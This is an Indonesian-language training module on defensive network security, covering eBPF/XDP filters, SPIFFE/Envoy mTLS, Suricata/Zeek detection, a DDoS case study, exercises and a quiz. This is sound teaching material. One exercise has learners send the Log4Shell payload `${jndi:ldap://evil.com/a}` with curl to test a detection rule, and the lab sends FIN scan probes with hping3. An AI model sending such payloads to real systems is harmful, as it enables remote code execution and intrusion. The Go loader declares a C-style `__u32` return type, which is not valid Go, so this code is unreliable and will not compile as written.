# Kurikulum Rekayasa Keamanan Siber Lanjutan
## Kategori: 07-Quality-and-Security
### Bab 02: Network Security & Traffic Analysis
#### Modul 02: Deep Dive, Implementasi Lanjutan & Arsitektur Produksi

---

### 1. Learning Objective

Setelah menyelesaikan modul ini, peserta diharapkan mampu:
- Mendesain dan mengimplementasikan arsitektur proteksi jaringan nir-kepercayaan (*Zero Trust Network Architecture/ZTNA*) berskala enterprise pada kluster hybrid-cloud dan multi-region.
- Menguasai pembedahan protokol (*deep packet inspection/DPI*) tingkat rendah dan pemfilteran lalu lintas berkinerja tinggi menggunakan teknologi **eBPF (Extended Berkeley Packet Filter)** dan **XDP (eXpress Data Path)** di *kernel space*.
- Membangun pipeline deteksi anomali dan ancaman otomatis (*Intrusion Detection/Prevention System*) berbasis **Suricata** dan **Zeek** yang terintegrasi dengan event-streaming pipeline (Kafka/OpenSearch).
- Mengonfigurasi enkripsi transport antar-layanan terdistribusi (*Mutual TLS/mTLS*) dengan validasi identitas kriptografis dinamis berbasis standar **SPIFFE/SPIRE** dan Envoy Proxy.
- Mendiagnosis, melakukan mitigasi, dan memecahkan masalah serangan jaringan volumetrik (DDoS L3/L4/L7), penyelundupan protokol (*HTTP request smuggling*), dan peretasan berbasis anomali TCP/IP dengan dampak zero-downtime.

---

### 2. Prerequisite

Untuk mencerna materi ini secara optimal, peserta wajib menguasai:
- **Jaringan Komputer Dasar & Menengah**: Model OSI 7-Layer, TCP 3-way handshake, state-machine TCP, DNS, TLS 1.3 handshake, subnetting CIDR, VLAN, dan routing BGP.
- **Sistem Operasi Linux Lanjutan**: Linux networking stack (Netfilter, iptables, nftables), socket programming (POSIX), manipulasi interface (`iproute2`, `tc`), dan arsitektur Linux Kernel space vs User space.
- **Bahasa Pemrograman**: 
  - Bahasa **C** dasar (sintaksis, alokasi memori, struct, dan pointer) untuk memahami program eBPF.
  - Bahasa **Go** atau **Python** untuk otomatisasi analisis paket dan konsumsi API telemetri.
- **Container & Orchestration**: Dasar Kubernetes (CNI, Pod networking, Service abstraction, iptables/IPVS proxy mode).

---

### 3. Concept & Internal Architecture (Mendalam)

#### 3.1 Evolusi Pemrosesan Paket Linux: Netfilter vs. eBPF/XDP

Dalam pemrosesan paket jaringan konvensional di Linux, paket data yang tiba di Network Interface Card (NIC) memicu penanganan interupsi (IRQ) dan alokasi struktur data kernel berukuran besar yang disebut `sk_buff` (socket buffer).

```
[ NIC Hardware ]
       │
       ▼ (DMA Transfer)
[ Ring Buffer ] ──► [ XDP Hook (eBPF) ]  <-- DROPOUT TERCEPAT (Sub-mikrodetik)
                           │
                 ┌─────────┴─────────┐
                 │ (Jika XDP_PASS)   │
                 ▼                   ▼
          [ Alokasi sk_buff ]    [ XDP_DROP / XDP_TX ]
                 │
                 ▼
       [ Netfilter / iptables ]  <-- Overhead memori & context switch
                 │
                 ▼
          [ TCP/IP Stack ]
                 │
                 ▼
         [ Socket Layer ]
                 │
                 ▼ (Copy to User Space)
      [ User Space Application ]
```

1. **Jalur Tradisional (`sk_buff` & Netfilter)**:
   - Setiap paket dialokasikan ke dalam `sk_buff`. Biaya alokasi memori dan parsing metadata sangat membebani CPU saat menghadapi serangan volumetrik (jutaan paket per detik / Mpps).
   - Ruleset `iptables` bersifat linear $O(N)$ jika tidak dioptimalkan dengan `ipset` ($O(1)$), yang menghasilkan degradasi performa drastis ketika tabel memiliki puluhan ribu aturan pemfilteran.

2. **Jalur Modern (eXpress Data Path / XDP)**:
   - XDP menyediakan titik eksekusi (*hook point*) langsung di driver NIC, tepat sebelum memori `sk_buff` dialokasikan.
   - Program bytecode eBPF dieksekusi di *in-kernel virtual machine* yang telah diverifikasi keamanannya (*eBPF verifier*) dan dikompilasi ke kode mesin asli via Just-In-Time (JIT) compiler.
   - Keputusan perutean atau pembuangan paket (`XDP_DROP`, `XDP_TX`, `XDP_REDIRECT`) dilakukan langsung pada buffer mentah `xdp_md`, menghasilkan kemampuan mitigasi serangan DDoS hingga wire-speed line-rate (mencapai 10-40+ Mpps per core CPU).

#### 3.2 Dynamic Micro-segmentation & SPIFFE/SPIRE Core Architecture

Dalam arsitektur Zero Trust, IP address dianggap tidak tepercaya (*ephemeral* dan rentan *spoofing*). Identitas jaringan digeser ke entitas kriptografis terdesentralisasi:

- **SPIFFE (Secure Production Identity Framework for Everyone)** mendefinisikan standar identifier dalam bentuk URI: `spiffe://<trust-domain>/ns/<namespace>/sa/<service-account>`.
- **SPIRE (SPIFFE Runtime Environment)** adalah implementasi *node agent* dan *server* yang memverifikasi identitas beban kerja (*workload attestation*) melalui atribut kernel (PID, cgroup, container metadata) tanpa menyematkan secret statis pada disk atau environment variable.
- Kredensial dinamis berumur pendek berupa X.509 SVID (*SPIFFE Verifiable Identity Document*) disuntikkan secara otomatis melalui Unix Domain Socket ke Envoy Proxy untuk negosiasi mTLS Layer 7.

---

### 4. Why & What

| Dimensi | Pendekatan Tradisional (Perimeter Security) | Pendekatan Modern Enterprise (ZTNA + In-Kernel DPI) |
| :--- | :--- | :--- |
| **Model Kepercayaan** | Implisit (*Internal network is safe, edge is hostile*). | Eksplisit (*Assume breach*, verifikasi identitas di setiap hop). |
| **Enkripsi** | Didekripsi di Edge Load Balancer; lalu lintas internal plain-text. | End-to-end mTLS (Layer 4/7) di seluruh kanal komunikasi internal. |
| **Mekanisme Filter** | Statis berbasis IP/Port (Firewall appliances, security groups). | Identitas kriptografis (SPIFFE IDs) & L7 metadata (Path, Headers). |
| **Latensi Inspeksi** | Tinggi (Deep packet inspection via user-space appliances). | Sangat rendah (eBPF in-kernel bypass, sub-mikrodetik di layer XDP). |
| **Skalabilitas Kontrol**| Tersentralisasi (*Choke point*, rawan *single point of failure*). | Terdistribusi via sidecar/ambient data plane dan eBPF engine. |

**Mengapa ini penting?** 
Serangan lateral (*lateral movement*) oleh penyerang tingkat lanjut (APT) mengeksploitasi jaringan internal yang datar (*flat network*). Ketika pertahanan perimeter tertembus, penyerang bebas memindai port, menyadap lalu lintas tidak terenkripsi, dan mencuri kredensial database. Implementasi ZTNA, micro-segmentation, dan monitoring L3-L7 realtime mencegah pergerakan lateral tersebut secara deterministik.

---

### 5. How (Workflow Detail)

Alur penegakan keamanan jaringan pada arsitektur modern berjalan secara paralel di kernel space dan user space:

```
[ Paket Masuk dari Jaringan ]
             │
             ▼
   [ 1. XDP / eBPF Layer ] ──── (Drop jika anomali L3/L4 / DDoS) ──► [ DROP & LOG ]
             │
             ├──── (Kirim salinan paket via eBPF Perf Ring Buffer)
             │                              │
             ▼ (Paket Valid)                ▼
     [ 2. Linux TC Layer ]      [ 3. Zeek / Suricata IDS Engine ]
             │                              │
             ▼                              ▼
  [ 4. Envoy Data Plane ]       [ Deteksi L7 Signature & Protocol Anomaly ]
             │                              │
     (Validasi mTLS SVID)                   ▼
             │                  [ Security Alert / SIEM Pipeline ]
             ▼
  [ 5. Target Application Workload ]
```

1. **Ingress Filtering (XDP Hook)**: Memeriksa header Ethernet, IP, dan TCP/UDP. Blokir flag TCP ilegal (contoh: NULL scan, XMAS scan) dan mitigasi serangan SYN flood volumetrik via eBPF Map Lookup.
2. **Mirroring Asinkron (Traffic Tapping)**: Paket yang lolos dialirkan secara asinkron tanpa memblokir jalur utama menuju sensor IDS/IPS (Suricata/Zeek) menggunakan AF_PACKET fanout atau eBPF ring buffer.
3. **Pemeriksaan L7 & Service Attestation (Envoy)**: Paket masuk ke proxy sidecar/ambient. Envoy memverifikasi sertifikat mTLS klien terhadap Trust Bundle SPIFFE, mencocokkan SPIFFE-ID dengan AuthorizationPolicy (misal: *Layanan A hanya boleh POST ke `/v1/checkout`*).
4. **Telemetri & Respon Otomatis**: Anomali yang terdeteksi di layer IDS memicu API controller untuk menyuntikkan IP atau SPIFFE ID berbahaya langsung ke kernel map eBPF penangkal (*blacklisting map*) secara real-time (< 100ms response loop).

---

### 6. Analogy & Diagram ASCII

#### Analogi: Bandara Internasional Berkeamanan Tinggi
- **Jaringan Tradisional (Perimeter)**: Seperti gerbang pemeriksaan paspor tunggal di pintu masuk bandara. Begitu seseorang masuk ke ruang tunggu, ia bebas masuk ke semua pesawat, ruang kontrol, atau ruang bagasi tanpa diperiksa lagi.
- **Arsitektur Zero Trust & eBPF (Modern)**:
  - **XDP (Gerbang Perimeter Luar)**: Pindai biometrik kilat instan di pagar luar. Siapa pun tanpa tiket langsung dialihkan keluar tanpa mengantre.
  - **Suricata/Zeek (Kamera Pengawas Analitik AI)**: CCTV canggih yang menganalisis gerak-gerik mencurigakan di koridor tanpa menghambat langkah pejalan kaki.
  - **SPIFFE/Envoy (Pintu Elektronik Setiap Pesawat)**: Di setiap pintu masuk kabin, pintu meminta kartu kunci kriptografis yang diverifikasi dan diperbarui setiap 10 menit. Tiket pesawat kelas ekonomi tidak akan pernah bisa membuka pintu kokpit (*Least Privilege Access*).

```
                     ZERO TRUST DISTRIBUTED INGRESS/EGRESS
                     
  Zone: Untrusted                   Zone: Kubernetes Data Plane
+--------------------+        +-----------------------------------------+
| Attacker / Client  |        | Host Node Linux Kernel                  |
+---------┬----------+        |                                         |
          │                   |   [ NIC Driver: eth0 ]                  |
          │ SYN Flood / HTTP  |           │                             |
          ▼                   |           ▼                             |
    +-----------+             |     +------------+                      |
    | Wire-edge |─────────────┼────►|  XDP Hook  |──► [XDP_DROP] Block  |
    +-----------+             |     +-----┬------+    Bad Signatures    |
                              |           │ (XDP_PASS)                  |
                              |           ▼                             |
                              |     +------------+                      |
                              |     | TC / eBPF  |──► [Ring Buffer]──┐  |
                              |     +-----┬------+                   │  |
                              |           │                          │  |
                              +───────────┼──────────────────────────┼──+
                                          │                          │
                               User Space ▼                          ▼
                        +──────────────────────────+     +─────────────────+
                        | Pod: Envoy Proxy         |     | Pod: Suricata   |
                        | - SPIFFE ID Verification |     | - Deep Packet   |
                        | - Layer 7 Policy Rules   |     |   Inspection    |
                        +-------------┬────────────+     | - Alert Engine  |
                                      │ (Localhost)      +--------┬--------+
                                      ▼                           │
                        +──────────────────────────+              ▼
                        | Pod: Microservice Engine |     +─────────────────+
                        | Application Logic        |     | Kafka / SIEM    |
                        +--------------------------+     +----------------─+
```

---

### 7. Simple Example & Practical Example

#### 7.1 Simple Example: eBPF/XDP Paket Filter (Penangkal Serangan L4 Port Scan)

Kode C berikut dapat dikompilasi menggunakan `clang -target bpf` untuk memblokir paket TCP dengan flag SYN-FIN (kombinasi anomali yang sering digunakan untuk stealth scanning) langsung di level driver network:

```c
// File: xdp_filter.c
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>

SEC("xdp")
int filter_syn_fin(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    // 1. Parsing Header Ethernet
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return XDP_PASS;

    // 2. Parsing Header IP
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    if (ip->protocol != IPPROTO_TCP)
        return XDP_PASS;

    // 3. Parsing Header TCP
    struct tcphdr *tcp = (void *)((unsigned char *)ip + (ip->ihl * 4));
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    // Deteksi Paket Anomali: SYN dan FIN aktif bersamaan
    if (tcp->syn && tcp->fin) {
        // Drop paket langsung di kernel ring buffer tanpa alokasi sk_buff
        return XDP_DROP;
    }

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
```

#### 7.2 Practical Example: Enterprise Network Engine Guard (Go + Cilium eBPF Loader + Dynamic Block Map)

Implementasi produksi modern memadukan *in-kernel data path* dengan *user-space control plane* dinamis.

##### Bagian A: Program eBPF C dengan BPF Hash Map

```c
// File: advanced_firewall.c
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>

// BPF Map untuk menampung IP yang diblokir secara dinamis
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 100000);
    __type(key, __u32);   // IPv4 Address (Network Byte Order)
    __type(value, __u64); // Drop Packet Counter
} blocked_ips SEC(".maps");

SEC("xdp")
int enterprise_firewall(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    __u32 src_ip = ip->saddr;
    __u64 *drop_count = bpf_map_lookup_elem(&blocked_ips, &src_ip);

    if (drop_count) {
        // Increment counter secara atomic dan drop paket
        __sync_fetch_and_add(drop_count, 1);
        return XDP_DROP;
    }

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
```

##### Bagian B: User-Space Control Plane dalam Go

```go
// File: main.go
package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

func ipToUint32(ipStr string) (__u32, error) {
	ip := net.ParseIP(ipStr).To4()
	if ip == nil {
		return 0, fmt.Errorf("invalid IPv4 address")
	}
	return binary.LittleEndian.Uint32(ip), nil
}

func main() {
	if len(os.Args) < 2 {
		log.Fatalf("Penggunaan: %s <interface_name>", os.Args[0])
	}
	ifaceName := os.Args[1]

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("Gagal membaca interface %s: %v", ifaceName, err)
	}

	// Load BPF Collection yang telah terkompilasi
	spec, err := ebpf.LoadCollectionSpec("advanced_firewall.o")
	if err != nil {
		log.Fatalf("Gagal memuat ELF spec: %v", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		log.Fatalf("Gagal inisialisasi collection: %v", err)
	}
	defer coll.Close()

	prog := coll.Programs["enterprise_firewall"]
	blockedMap := coll.Maps["blocked_ips"]

	// Attach program eBPF ke XDP interface hook
	l, err := link.AttachXDP(link.XDPOptions{
		Program:   prog,
		Interface: iface.Index,
		Flags:     link.XDPGenericMode, // Gunakan link.XDPDriverMode di hardware produksi
	})
	if err != nil {
		log.Fatalf("Gagal attach XDP program: %v", err)
	}
	defer l.Close()

	fmt.Printf("[+] XDP Firewall aktif pada interface: %s\n", ifaceName)

	// Simulasi mitigasi real-time: Blokir IP penyerang
	targetMaliciousIP := "198.51.100.42"
	rawIP, _ := ipToUint32(targetMaliciousIP)
	var initialCount uint64 = 0

	err = blockedMap.Put(rawIP, initialCount)
	if err != nil {
		log.Fatalf("Gagal menambahkan IP ke blacklisting map: %v", err)
	}
	fmt.Printf("[+] IP %s berhasil diisolasi ke dalam eBPF blocklist!\n", targetMaliciousIP)

	// Polling berkala metrik drop counter
	ticker := time.NewTicker(2 * time.Second)
	stopChan := make(chan os.Signal, 1)
	signal.Notify(stopChan, os.Interrupt, syscall.SIGTERM)

	for {
		select {
		case <-ticker.C:
			var counter uint64
			err := blockedMap.Lookup(rawIP, &counter)
			if err == nil {
				fmt.Printf("[METRIK] Paket diblokir dari %s: %d\n", targetMaliciousIP, counter)
			}
		case <-stopChan:
			fmt.Println("\n[*] Menghentikan firewall dan membersihkan hook...")
			return
		}
	}
}
```

---

### 8. Real World Case Study (Enterprise Scale)

#### Kasus: FinTech Tier-1 Payment Gateway Under Multi-Vector DDoS & Scraping
- **Skala Sistem**: 
  - 80 Kubernetes Nodes (bare-metal, 100 Gbps dual-link per node).
  - Normal traffic: 120.000 HTTP Requests Per Second (RPS) pada API Core Payment.
- **Insiden**:
  - Pelaku meluncurkan serangan multivektor: 
    1. L4 Amplified UDP Flood & TCP ACK Storm (55 Mpps / 40 Gbps) untuk melumpuhkan conntrack Linux.
    2. L7 API Credential Stuffing & Scraping dengan rotasi ribuan IP botnet terdistribusi menyerang endpoint `/api/v1/auth/token`.
- **Dampak Awal**:
  - Tabel `nf_conntrack: table full, dropping packet` jebol pada Node ingress.
  - Latensi P99 melesat dari 4.2ms ke 12.800ms; time-out massal transaksi perbankan.

#### Solusi Implementasi Arsitektur
1. **L4 Layer**: 
   - Melepas komponen `iptables` kube-proxy dan beralih ke **Cilium CNI dengan eBPF Host Routing**.
   - Mengaktifkan **XDP-based SYN Proxy** bawaan eBPF untuk menyaring invalid TCP 3-way handshake tanpa membuka entri kernel state session (`sk_buff`).
2. **L7 Layer**:
   - Menerapkan **Envoy Proxy Rate Limiting Service (RLS)** dengan Redis Cluster terdistribusi.
   - Mengonfigurasi **Suricata IDS** pada interface bridge mirror untuk mendeteksi *anomalous cipher suites* dan *ja3/ja4 fingerprint* botnet.
   - Script orchestrator membaca deteksi Zeek/Suricata dan menulis langsung ke map eBPF `blocked_ips` dalam interval waktu < 50ms.

#### Hasil
- CPU Kernel Utilization turun dari 98% menjadi 11% di seluruh cluster.
- Paket serangan L4 dibuang di tingkat driver card (XDP) dengan kecepatan ~48 Mpps per server tanpa mengonsumsi tabel conntrack.
- Latensi P99 API pembayaran kembali stabil pada 4.5ms di tengah puncak serangan.

---

### 9. Trade-offs

```
                       PERFORMANCE (Throughput/Latency)
                                     ▲
                                    / \
                                   /   \
                                  /     \
                         eBPF/XDP/       \
                          DPDK  /         \ Envoy / SPIFFE
                               /           \ (Full L7 Context)
                              /             \
                             /               \
                            /                 \
                           /                   \
                          /                     \
                         ▼                       ▼
  MAINTAINABILITY ◄────────────────────────────────► SECURITY DEPTH
  (Ease of debug/Rules)                              (Decryption, WAF, SVID)
```

| Pendekatan | Keunggulan | Konsekuensi / Kerugian |
| :--- | :--- | :--- |
| **XDP / eBPF Kernel Drops** | Throughput ultra-tinggi (wire-speed), memori statis konstan, tidak membebani kernel conntrack. | Tidak memiliki pemahaman protokol Layer 7 (tidak bisa memeriksa payload terenkripsi TLS), debugging bytecode sulit via `bpf_trace_printk`. |
| **Service Mesh mTLS (Envoy)** | Enkripsi end-to-end, validasi identitas SPIFFE L7 yang kaya, otentikasi berbasis atribut (*ABAC/RBAC*). | Penambahan latensi baseline (0.5ms - 2.5ms per hop proxy), lonjakan konsumsi CPU/RAM untuk terminasi TLS di setiap container/pod. |
| **Zeek / Suricata Tapping** | Analisis forensik mendalam, deteksi tanda tangan L7 luas, pembuatan audit log jaringan terpusat yang lengkap. | Membutuhkan alokasi resource komputasi besar; jika dikonfigurasi sebagai *Inline IPS*, dapat menjadi *bottleneck* bottleneck total lalu lintas sistem. |

---

### 10. Common Mistakes & Troubleshooting

#### 10.1 Common Mistake 1: Exhausting `nf_conntrack` Table
* **Gejala**: Log kernel menampilkan `nf_conntrack: table full, dropping packet`. Node menolak koneksi TCP baru meskipun CPU dan RAM masih tersisa 70%.
* **Penyebab**: Lalu lintas port scanning atau SYN flood volumetrik memenuhi alokasi tabel session state Netfilter.
* **Solusi**: 
  - Gunakan `iptables -t raw -A PREROUTING -p tcp -m tcp --dport <PORT> -j NOTRACK` untuk lalu lintas stateless throughput tinggi.
  - Alihkan pemfilteran ke arsitektur XDP eBPF yang beroperasi sebelum subsistem conntrack.

#### 10.2 Common Mistake 2: Program eBPF Ditolak oleh Kernel Verifier
* **Gejala**: Perintah compile berjalan lancar, namun saat injeksi ke kernel muncul galat: `math between fp pointer and register... R1 offset is outside of the packet`.
* **Penyebab**: Pengembang lupa melakukan *packet boundary checks* sebelum membaca data memori (`eth + 1 > data_end`).
* **Solusi**: Pastikan setiap akses pointer protokol selalu didahului oleh validasi batas atas memori:
  ```c
  if ((void *)(tcp_header + 1) > data_end) {
      return XDP_DROP; // atau XDP_PASS
  }
  ```

#### 10.3 Common Mistake 3: Latensi Melesat Akibat "TCP Window Starvation" pada mTLS Mesh
* **Gejala**: Throughput data antar microservice anjlok signifikan saat mengaktifkan enkripsi mTLS Envoy.
* **Penyebab**: Konfigurasi buffer buffer socket Envoy (`initial_stream_window_size` dan `initial_connection_window_size`) bernilai default terlalu kecil (64KB) untuk pipa jaringan bandwidth tinggi / berlatensi medium.
* **Solusi**: Sesuaikan window size HTTP/2 pada Envoy configuration:
  ```yaml
  http2_protocol_options:
    initial_stream_window_size: 6553600 # 6MB
    initial_connection_window_size: 10485760 # 10MB
  ```

---

### 11. Best Practices (Production Checklist)

#### Kernel & Ingress Hardening
- [ ] Nonaktifkan Linux Source Routing (`net.ipv4.conf.all.accept_source_route = 0`).
- [ ] Aktifkan TCP SYN Cookie Protection (`net.ipv4.tcp_syncookies = 1`).
- [ ] Aktifkan Reverse Path Filtering (`net.ipv4.conf.all.rp_filter = 1`) untuk mencegah IP Spoofing.
- [ ] Naikkan ukuran ring buffer antarmuka jaringan: `ethtool -G eth0 rx 4096 tx 4096`.
- [ ] Pasang XDP hook dalam mode **Native/Driver Mode** (bukan Generic Mode) untuk memaksimalkan performa di NIC produksi (Mellanox/Intel).

#### Identity & Transport Security
- [ ] Rotasi sertifikat SVID SPIFFE secara otomatis dengan interval agresif ($\le 1\text{ jam}$).
- [ ] Terapkan TLS 1.3 secara eksklusif; nonaktifkan cipher suites TLS 1.0, 1.1, dan RSA non-PFS.
- [ ] Standarisasi ALPN (*Application-Layer Protocol Negotiation*) ke `h2` atau `http/1.1` secara eksplisit pada Envoy filter.

---

### 12. Hands-on Practice

Struktur direktori praktikum yang wajib dibangun:
```
hands-on/m02/
├── Makefile
├── bpf/
│   └── filter.c
├── configs/
│   ├── envoy.yaml
│   └── suricata.yaml
└── cmd/
    └── loader.go
```

#### Langkah 1: Persiapan Environment Linux VM (Ubuntu 22.04 LTS / Kernel >= 5.15)
Pasang dependency compiler toolchain:
```bash
sudo apt-get update && sudo apt-get install -y \
    clang llvm libelf-dev libpcap-dev gcc-multilib build-essential \
    linux-tools-$(uname -r) linux-headers-$(uname -r) suricata
```

#### Langkah 2: Buat Source eBPF Kernel Space (`hands-on/m02/bpf/filter.c`)
Salin kode berikut untuk memvalidasi dan memblokir port scanning TCP FIN tanpa ACK:

```c
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <bpf/bpf_helpers.h>

SEC("xdp")
int packet_monitor(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != __constant_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != IPPROTO_TCP) return XDP_PASS;

    struct tcphdr *tcp = (void *)((unsigned char *)ip + (ip->ihl * 4));
    if ((void *)(tcp + 1) > data_end) return XDP_PASS;

    // Deteksi stealth FIN probe
    if (tcp->fin && !tcp->ack) {
        bpf_printk("[SECURITY] Terdeteksi FIN scan ilegal dari IP: %x\n", ip->saddr);
        return XDP_DROP;
    }

    return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
```

#### Langkah 3: Bangun Otomasi Kompilasi (`hands-on/m02/Makefile`)
```makefile
CLANG ?= clang
CFLAGS ?= -O2 -g -Wall -target bpf

all: build

build:
	$(CLANG) $(CFLAGS) -c bpf/filter.c -o bpf/filter.o

clean:
	rm -f bpf/filter.o
```

Eksekusi kompilasi:
```bash
cd hands-on/m02 && make
```

#### Langkah 4: Mount dan Uji Coba Penegakan Aturan
Pasang program XDP ke interface loopback atau ethernet lokal:
```bash
# Attach program XDP ke interface lo (loopback)
sudo ip link set dev lo xdpgeneric obj bpf/filter.o sec xdp

# Periksa trace pipe kernel untuk observabilitas event
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

Buka terminal kedua, kirim crafted packet menggunakan utility `hping3`:
```bash
# Kirim paket stealth probe FIN tanpa ACK
sudo hping3 -F -p 80 127.0.0.1 -c 3
```

Amati terminal pertama; pesan kernel `[SECURITY] Terdeteksi FIN scan ilegal...` akan tercetak seketika, dan paket tidak akan mencapai service user-space.

Lepas program XDP setelah pengujian selesai:
```bash
sudo ip link set dev lo xdpgeneric off
```

---

### 13. Exercise

#### Level Easy
1. Modifikasi program `bpf/filter.c` agar membuang (*drop*) semua paket ICMP Echo Request (Ping) yang masuk ke host tanpa menggunakan iptables.
2. Verifikasi efektivitas rule tersebut dengan mengirim perintah `ping 127.0.0.1`.

#### Level Medium
1. Buat rule deteksi **Suricata** kustom yang mendeteksi upaya penyerangan *Log4Shell* (JNDI injection) pada header HTTP `User-Agent`.
2. Uji rule tersebut menggunakan `curl` dengan menyisipkan payload `${jndi:ldap://evil.com/a}` dan buktikan kemunculan alert di `/var/log/suricata/fast.log`.

#### Level Hard
1. Buat ekstensi Go loader yang memetakan eBPF Map type `BPF_MAP_TYPE_LRU_HASH` untuk melacak rate-limiting IP: Jika satu IP mengirimkan lebih dari 100 paket SYN dalam kurun waktu 1 detik, XDP akan mengalihkan status IP tersebut ke mode `DROP` otomatis selama 60 detik.

---

### 14. Challenge

**Skenario**: Anda adalah Principal Security Engineer di sebuah Bank Central Digital. Sistem mendeteksi adanya *Slowloris Attack* dan *HTTP/2 Rapid Reset (CVE-2023-44487)* terdistribusi berskala masif yang berhasil melewati firewall L4 konvensional karena paket TCP handshake terbentuk secara sempurna (*valid 3-way handshake*). 

**Tantangan Arsitektur**:
1. Desainlah blueprint arsitektur jaringan pipeline proteksi tanpa downtime yang mampu memitigasi serangan ini.
2. Tentukan di titik layer mana inspeksi dilakukan: Driver NIC (XDP), Socket Layer (eBPF `sock_ops`), atau Reverse Proxy (Envoy). Berikan justifikasi teknis mendalam mengenai performa komputasi (CPU usage & context switching).
3. Buat skema konfigurasi Envoy / eBPF yang secara otomatis mendeteksi koneksi yang menahan stream tanpa mengirimkan body paket (`idle timeout`) dan putus koneksi di tingkat TCP Reset (`RST`) tanpa membebani alokasi memory thread aplikasi backend.

---

### 15. Quiz Evaluasi Pemahaman

#### Soal Basic (Pilihan Ganda & Konseptual)
1. Pada tahap apa program XDP mengeksekusi instruksi pemrosesan paket jaringan?
   - A. Setelah kernel Linux mengalokasikan struct `sk_buff`.
   - B. Tepat di driver antarmuka jaringan sebelum alokasi memori `sk_buff`.
   - C. Di dalam namespace aplikasi user-space.
   - D. Di dalam modul Netfilter hook POSTROUTING.
2. Apa fungsi dari program *eBPF Verifier* sebelum memuat kode ke kernel Linux?
   - A. Memastikan kode dikompilasi dengan enkripsi SHA-256.
   - B. Memvalidasi bahwa program aman dari memory leak, dereferensi pointer liar, dan loop tanpa batas.
   - C. Mengubah kode C langsung menjadi binary ARM64.
   - D. Menjamin sertifikat SSL web server valid.
3. Protokol TLS beroperasi pada layer OSI ke berapa?
   - A. Layer 3 (Network)
   - B. Layer 2 (Data Link)
   - C. Layer 4/6/7 (Transport/Presentation)
   - D. Layer 1 (Physical)
4. Apa kelemahan fatal verifikasi keamanan perimeter berbasis IP Address pada kluster Kubernetes?
   - A. IP Address pod bersifat ephemeral (dinamis dan mudah berubah saat restart).
   - B. IP Address tidak kompatibel dengan protokol DNS.
   - C. Kernel Linux menolak pemfilteran IP pada kontainer.
   - D. IP Address membutuhkan alokasi memori 100x lebih besar dari hostname.
5. Perintah apa yang digunakan untuk memeriksa apakah program XDP terpasang pada suatu antarmuka jaringan?
   - A. `netstat -tuln`
   - B. `ip link show <interface_name>`
   - C. `route -n`
   - D. `iptables -L`

#### Soal Intermediate (Analisis Arsitektur & Kasus)
6. Mengapa serangan HTTP Request Smuggling dapat terjadi di balik arsitektur Reverse Proxy?
   - A. Terjadi tabrakan enkripsi antara TLS 1.2 dan TLS 1.3.
   - B. Adanya ambiguitas interpretasi header `Content-Length` dan `Transfer-Encoding: chunked` antara frontend proxy dan backend server.
   - C. DNS cache poisoning pada load balancer.
   - D. eBPF salah mengenali nomor port TCP.
7. Apa perbedaan fundamental antara mode penempatan *Suricata* sebagai **IDS** (Intrusion Detection System) versus **IPS** (Intrusion Prevention System)?
   - A. IDS membaca salinan paket via TAP/Mirror (asinkron); IPS berada inline di jalur paket dan berhak drop paket (sinkron).
   - B. IDS memfilter Layer 4, sedangkan IPS memfilter Layer 7.
   - C. IDS berbasis eBPF, sedangkan IPS berbasis iptables.
   - D. IDS hanya bekerja pada protokol UDP, IPS pada protokol TCP.
8. Bagaimana framework SPIFFE/SPIRE mencegah pencurian token identitas antar container yang berjalan di node yang sama?
   - A. Menyimpan password root di file `/etc/shadow`.
   - B. Menggunakan kernel workload attestation (memeriksa atribut Unix Socket peer PID, UID, cgroups).
   - C. Mengenkripsi hard disk secara penuh (Full Disk Encryption).
   - D. Memblokir port 443 pada loopback interface.
9. Jelaskan trade-off performa antara Envoy Proxy berarsitektur *Sidecar* (1 pod, 1 proxy) dibanding *Shared-Node Proxy* (1 host, 1 proxy)!
10. Mengapa pemeriksaan batas pointer (`data + offset > data_end`) wajib dilakukan pada setiap step parsing header di program eBPF?

#### Skenario Kasus Produksi
11. **Skenario 1**: Sebuah node Kubernetes tiba-tiba kehilangan konektivitas jaringan secara sporadis. Saat dilakukan inspeksi, utilitas CPU menunjukkan 100% pada *Software Interrupts* (`%si` pada tool `top`). Paket masuk mencapai 800.000 pps UDP ke port acak. Jelaskan langkah diagnosis step-by-step dan tindakan mitigasi tercepat menggunakan XDP!
